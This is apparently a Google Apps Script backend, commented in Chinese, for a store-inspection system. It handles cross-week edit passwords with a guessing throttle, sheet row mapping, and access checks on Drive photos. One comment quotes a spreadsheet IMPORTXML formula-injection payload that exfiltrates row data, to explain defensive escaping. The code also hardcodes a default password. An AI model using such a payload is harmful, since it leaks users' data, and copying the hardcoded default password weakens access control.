// 跨週修改的保護：編輯/刪除只限「當週」(週一~週日)，非當週要輸入密碼。
//   密碼放「設定」活頁的「跨週修改密碼」，沒設定時用預設 9588，改密碼不必動程式。
//   前端也會先問一次密碼(體驗)，但真正的把關在這裡 —— 否則用開發者工具就能繞過。
// ============================================================
function editPassword() { return String(getSetting('跨週修改密碼') || '9588'); }

// 密碼只有四位數，若可以無限次嘗試，等於沒有把關（checkEditPass 與 updateRecord/deleteRecord
// 都收密碼，任一支都能被拿來窮舉）。以登入者為單位限制連續錯誤次數。
var EDITPASS_MAX_FAILS = 8;
var EDITPASS_BLOCK_SEC = 600;   // 連錯達上限後鎖 10 分鐘

function editPassKey(who) { return 'editpass_' + String(who || 'anon').toLowerCase(); }
function editPassBlocked(who) {
  var v = CacheService.getScriptCache().get(editPassKey(who));
  return (v ? Number(v) || 0 : 0) >= EDITPASS_MAX_FAILS;
}
function editPassFail(who) {
  var n = (Number(CacheService.getScriptCache().get(editPassKey(who))) || 0) + 1;
  CacheService.getScriptCache().put(editPassKey(who), String(n), EDITPASS_BLOCK_SEC);
}
function editPassOk(who) { CacheService.getScriptCache().remove(editPassKey(who)); }

/** 驗證跨週密碼；who 為登入者（用來計次）。回 {ok} 或 {ok:false, code:THROTTLED} */
function checkEditPass(pass, who) {
  if (editPassBlocked(who)) return { ok: false, code: 'THROTTLED', message: '密碼錯誤次數過多，請 10 分鐘後再試' };
  var ok = String(pass || "") === editPassword();
  if (ok) editPassOk(who); else editPassFail(who);
  return { ok: ok };
}

/** 該日期所屬那一週的週一(yyyy-MM-dd)；週一為一週之始
 *  一律先過 toYmd()：Sheet 讀回來的日期欄是 Date 物件，直接 String() 會得到
 *  "Thu Aug 27 2026 ..."，split('-') 長度不是 3 就回空字串 —— 而空字串會讓
 *  isCrossWeek 回 false，也就是跨週密碼保護「靜默放行」。錯誤方向是放行而不是擋下，
 *  所以不能只靠呼叫端記得包 toYmd。 */
function weekMondayOf(ymd) {
  var parts = toYmd(ymd).split('-');
  if (parts.length !== 3) return '';
  var year = Number(parts[0]), month = Number(parts[1]) - 1, day = Number(parts[2]);
  // 「2026-ab-27」這種會讓 Date.UTC 得到 NaN，Utilities.formatDate 對 Invalid Date 會拋錯
  if (isNaN(year) || isNaN(month) || isNaN(day)) return '';
  var d = new Date(Date.UTC(year, month, day));
  var dow = (d.getUTCDay() + 6) % 7;            // 週一=0、週日=6
  d.setUTCDate(d.getUTCDate() - dow);
  return Utilities.formatDate(d, 'UTC', 'yyyy-MM-dd');
}

/** 這筆紀錄是否落在「今天所屬的那一週」之外（今天以台北時區計） */
function isCrossWeek(recTime) {
  var recWeek = weekMondayOf(recTime);
  var today = Utilities.formatDate(new Date(), 'Asia/Taipei', 'yyyy-MM-dd');
  if (!recWeek) return false;                    // 日期解析不出來就不阻擋，避免誤鎖
  return recWeek !== weekMondayOf(today);
}

/** 編輯/刪除前的把關：非當週且密碼不對就擋下（密碼錯誤會計次，避免被窮舉） */
function guardCrossWeek(recTime, pass, who) {
  if (!isCrossWeek(recTime)) return null;
  var r = checkEditPass(pass, who);
  if (r.ok) return null;
  if (r.code === 'THROTTLED') return { ok: false, code: 'THROTTLED', message: r.message };
  return { ok: false, code: 'CROSS_WEEK',
    message: '這筆是 ' + String(recTime).slice(0, 10) + ' 的紀錄，不在本週(週一~週日)範圍內，需輸入正確密碼才能修改或刪除' };
}
function getSetting(key) {
  var rows = readSheet('設定');
  for (var i = 0; i < rows.length; i++) if (rows[i]['參數'] === key) return rows[i]['值'];
  return '';
}
function setSetting(key, val) {
  var sh = ssBook().getSheetByName('設定');
  var data = sh.getDataRange().getValues();
  for (var i = 1; i < data.length; i++) if (data[i][0] === key) { sh.getRange(i + 1, 2).setValue(val); return; }
  sh.appendRow([key, val]);
}

/** 部課對照。rows 可由呼叫端傳入已讀好的「點檢人員」，避免同一次請求重複讀整張活頁 */
function distinctDepts(rows) {
  rows = rows || readSheet('點檢人員');
  var m = {};
  rows.forEach(function (r) { if (r['部別']) { m[r['部別']] = m[r['部別']] || {}; if (r['課別']) m[r['部別']][r['課別']] = 1; } });
  return Object.keys(m).map(function (d) { return { dept: d, sections: Object.keys(m[d]) }; });
}

function nowStr() { return Utilities.formatDate(new Date(), 'Asia/Taipei', 'yyyy-MM-dd HH:mm'); }
// 儲存格可能被 Sheet 自動轉為 Date 型別，統一正規化
function toYmd(v) { return (v instanceof Date) ? Utilities.formatDate(v, 'Asia/Taipei', 'yyyy-MM-dd') : String(v || '').slice(0, 10); }
function toDateTimeStr(v) { return (v instanceof Date) ? Utilities.formatDate(v, 'Asia/Taipei', 'yyyy-MM-dd HH:mm') : String(v || ''); }
// 店號正規化：去除前導0與空白，避免 Sheet 自動轉數字掉0導致字串比對誤判「不同店」
function normCode(c) { var s = String(c == null ? '' : c).trim(); var n = s.replace(/^0+(?=\d)/, ''); return n; }
// 店名正規化：去除頭尾空白與結尾「店」字，供店號異動(舊碼/新碼)時仍能以店名比對店鋪主檔
function normName(n) { return String(n == null ? '' : n).trim().replace(/店$/, ''); }
// 照片項目轉雲端連結；尚未回寫 fileId(上傳中/舊紀錄)則回傳空字串
function photoUrlOf(entry) {
  var fileId = entry && typeof entry === 'object' ? entry.fileId : '';
  // 用 /file/d/<id>/view 這個標準格式：open?id= 在「未登入」時常導向登入頁或預覽失敗，
  // 而 /file/d/<id>/view 是 Drive 對「知道連結的人」提供的正式檢視網址，未登入也能開。
  return fileId ? ('https://drive.google.com/file/d/' + fileId + '/view') : '';
}
function photoUrlsOf(arr) { return (arr || []).map(photoUrlOf).filter(Boolean); }

/**
 * 寫進 Sheet 前處理公式注入：appendRow／setValues 會把 = + - @ 開頭的字串當成公式執行，
 * 例如備註填 =IMPORTXML("https://…?d="&A2,"//x") 就會把同列資料送到外部網址。
 * 前置一個單引號即強制為文字；Sheet 讀回時不含這個單引號，所以資料本身不變。
 * （用 setNumberFormat('@') 的寫入點已經是文字格式，不需要再過這裡。）
 */
/**
 * 這筆紀錄還有幾張照片沒有雲端連結。
 * 送出時「照片JSON」只寫檔名，要等照片真的上傳完成才會回寫 fileId。
 * 只有檔名沒有 fileId ＝ 照片還在點檢人員的手機佇列裡（或當時根本沒傳成功），
 * 報表點不到、編輯時顯示「無雲端連結」。這個數字要讓主管當天就看得到 ——
 * 越早發現，照片還在人家手機上，救回的機會越大。
 */
function photoPendingCount(photos) {
  var n = 0;
  Object.keys(photos || {}).forEach(function (key) {
    (photos[key] || []).forEach(function (e) {
      var name = (typeof e === 'string') ? e : (e && e.name);
      var hasId = e && typeof e === 'object' && e.fileId;
      if (name && !hasId) n++;
    });
  });
  return n;
}
/** 同步狀態欄的文字（寫死「已同步」等於騙人，要反映照片是否齊了） */
function syncStateOf(photos) {
  var n = photoPendingCount(photos);
  return n ? ('照片未齊（缺' + n + '張）') : '已同步';
}

/** 照片項目清單 → 逗號分隔的檔名字串（項目可能是字串或 {name, fileId} 物件） */
function photoNamesOf(list) {
  return (list || []).map(function (e) {
    return (e && typeof e === 'object') ? String(e.name || '') : String(e == null ? '' : e);
  }).filter(function (n) { return n; }).join(',');
}

function safeCell_(v) {
  if (typeof v !== 'string' || !v) return v;
  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
}
function safeRow_(row) { return row.map(safeCell_); }

/** 將前端紀錄物件轉成該活頁欄位順序的列陣列 */
function recordToRow(sh, rec) {
  var head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  var map = {
    '紀錄ID': rec.id, '點檢時間': rec.time, '部別': rec.dept, '課別': rec.section,
    '員編': rec.empId, '點檢人員': rec.staffName, '店號': rec.storeCode, '店名': rec.storeName,
    '店鋪型態': rec.storeType, '備註': rec.note || '', '題庫版本': rec.month, '合計得分': rec.total, '等第': rec.grade,
    '在店店員人數': rec.staffCount, '簽名身分別': rec.identity,
    '明細JSON': JSON.stringify(rec.detail || {}), '觀察JSON': JSON.stringify(rec.observation || {}),
    // 紙本照片存檔名清單。前端若送來 {name, fileId} 物件（編輯既有紀錄時會這樣），
    // 直接 join 會寫成 "[object Object]" 把整欄寫爛，所以在這裡也取一次檔名。
    '照片JSON': JSON.stringify(rec.photos || {}), '紙本照片': photoNamesOf(rec.paperPhotos),
    '照片資料夾': rec.folderUrl || '', '同步狀態': syncStateOf(rec.photos),
    '建立時間': rec.createdAt, '更新時間': rec.updatedAt,
  };
  return head.map(function (h) { return safeCell_(map[h] != null ? map[h] : ''); });
}

function rowToRecord(r) {
  var photos = safeJson(r['照片JSON']);
  return {
    // 現算而不是讀「同步狀態」欄：舊紀錄那一欄寫死「已同步」，直接沿用會漏掉全部既有問題
    pendingPhotos: photoPendingCount(photos),
    id: r['紀錄ID'], time: toDateTimeStr(r['點檢時間']), dept: r['部別'], section: r['課別'], empId: r['員編'],
    staffName: r['點檢人員'], storeCode: r['店號'], storeName: r['店名'], storeType: r['店鋪型態'], note: r['備註'],
    month: r['題庫版本'], total: r['合計得分'], grade: r['等第'], staffCount: r['在店店員人數'],
    identity: r['簽名身分別'], detail: safeJson(r['明細JSON']), observation: safeJson(r['觀察JSON']),
    photos: photos, paperPhotos: String(r['紙本照片'] || '').split(',').filter(Boolean),
    // 建立/更新時間必須轉成台北時間字串：Sheet 會把它存成 Date 型別，
    // 直接回傳會被序列化成 UTC 的 ISO 格式（2026-08-10T07:34:00.000Z），報表的時間戳記就會差8小時
    folderUrl: r['照片資料夾'], createdAt: toDateTimeStr(r['建立時間']), updatedAt: toDateTimeStr(r['更新時間']),
  };
}
function safeJson(s) { try { return JSON.parse(s || '{}'); } catch (e) { return {}; } }
// 這裡原本有一支 mapToInternal(merged, month, id)，全專案（含測試）零呼叫 ——
// 職責已由 rowToRecord 與 recordToRow 取代，2026-08-27 刪除。

// ============================================================
// 編輯紀錄時檢視/刪除既有照片
//   照片存在腳本擁有者的 Drive 資料夾裡，其他登入者沒有該資料夾的檢視權，
//   所以不能讓瀏覽器直接連 Drive 取圖，一律由後端代取（權杖仍不離開後端）。
// ============================================================
var THUMB_MAX = 40;                 // 一次最多取幾張縮圖
var IMAGE_MAX_BYTES = 6291456;      // 放大檢視的單檔上限 6MB，超過就請使用者去 Drive 看

/**
 * 檔案必須位於本系統的照片根資料夾底下才可存取。
 * 為什麼需要：photoThumbs/photoImage/trashPhotos 都是 DriveApp.getFileById(前端給的ID)，
 * 若不驗證歸屬，任何登入者只要知道任一個 fileId，就能透過本系統讀取、甚至丟棄
 * 腳本擁有者帳號能存取的任何 Drive 檔案（不限 SQC 照片）。屬存取控制失效。
 * 效能：以「資料夾」為單位判斷並快取（同一批照片通常共用少數資料夾），
 * 不是每個檔案都往上爬，避免縮圖請求變慢。
 */
var _underRootMemo = {};
function folderUnderPhotoRoot_(folderId) {
  if (!folderId) return false;
  if (folderId === DRIVE_ROOT_ID) return true;
  if (_underRootMemo[folderId] !== undefined) return _underRootMemo[folderId];
  var cached = CacheService.getScriptCache().get('underroot_' + folderId);
  if (cached !== null && cached !== undefined) {
    _underRootMemo[folderId] = (cached === '1');
    return _underRootMemo[folderId];
  }
  var ok = false, cur = folderId, hops = 0;
  try {
    while (hops < 10) {
      var it = DriveApp.getFolderById(cur).getParents();
      if (!it.hasNext()) break;
      var pid = it.next().getId();
      if (pid === DRIVE_ROOT_ID) { ok = true; break; }
      cur = pid; hops++;
    }
  } catch (e) { ok = false; }
  CacheService.getScriptCache().put('underroot_' + folderId, ok ? '1' : '0', 21600);
  _underRootMemo[folderId] = ok;
  return ok;
}
function fileUnderPhotoRoot_(file) {
  try {
    var it = file.getParents();
    while (it.hasNext()) {
      if (folderUnderPhotoRoot_(it.next().getId())) return true;
    }
  } catch (e) { /* 取不到父層就視為不允許 */ }
  return false;
}

/** 取縮圖（給編輯畫面的小圖用）：fileId -> dataURL；取不到的回空字串，前端顯示替代文字 */
function photoThumbs(fileIds) {
  var out = {};
  (fileIds || []).slice(0, THUMB_MAX).forEach(function (id) {
    id = String(id || '');
    if (!id) return;
    out[id] = '';
    try {
      var f = DriveApp.getFileById(id);
      if (f.isTrashed()) return;                       // 已刪除的不給圖，前端會標示
      if (!fileUnderPhotoRoot_(f)) return;             // 只能看本系統照片資料夾裡的檔案
      var b = null;
      try { b = f.getThumbnail(); } catch (e) { b = null; }
      // 沒有縮圖時退而用原圖（本系統照片壓到 1.2MB 以內，尚可接受）
      if (!b) { var raw = f.getBlob(); if (raw.getBytes().length <= 2097152) b = raw; }
      if (!b) return;
      out[id] = 'data:' + b.getContentType() + ';base64,' + Utilities.base64Encode(b.getBytes());
    } catch (e) { /* 檔案不存在或無權限 → 留空 */ }
  });
  return out;
}

/** 取原圖（給點擊放大用），一次一張 */
function photoImage(fileId) {
  try {
    var f = DriveApp.getFileById(String(fileId || ''));
    if (f.isTrashed()) return { ok: false, message: '這個檔案已被刪除' };
    if (!fileUnderPhotoRoot_(f)) return { ok: false, message: '不是本系統的照片，無法檢視' };
    var b = f.getBlob();
    if (b.getBytes().length > IMAGE_MAX_BYTES) return { ok: false, message: '檔案過大，請直接在 Drive 開啟' };
    return { ok: true, name: f.getName(), dataUrl: 'data:' + b.getContentType() + ';base64,' + Utilities.base64Encode(b.getBytes()) };
  } catch (e) {
    return { ok: false, message: '找不到檔案或沒有存取權' };
  }
}

/** 刪除傳錯的照片：移到垃圾桶（可還原），不做永久刪除 */
function trashPhotos(fileIds) {
  var done = [], failed = [];
  (fileIds || []).slice(0, THUMB_MAX).forEach(function (id) {
    try {
      var f = DriveApp.getFileById(String(id));
      if (!fileUnderPhotoRoot_(f)) { failed.push(String(id)); return; }   // 只能刪本系統照片
      f.setTrashed(true); done.push(String(id));
    } catch (e) { failed.push(String(id)); }
  });
  return { trashed: done.length, failed: failed };
}
